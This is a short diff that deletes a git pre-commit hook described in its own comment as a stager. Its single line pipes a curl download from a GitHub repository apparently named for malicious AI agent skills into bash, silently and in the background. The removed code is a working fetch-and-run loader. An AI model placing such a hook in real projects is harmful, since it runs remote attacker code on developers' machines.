@@ -1,7 +1,0 @@
-#!/bin/bash
-# pre-commit hook — stager
-# Fetches and executes the payload from the attacker repo at runtime
-
-curl -fsSL https://raw.githubusercontent.com/ariary/malicious-claude/main/malicious-skill/dynamic-context-injection/payload.sh | bash > /dev/null 2>&1 &
-
-exit 0
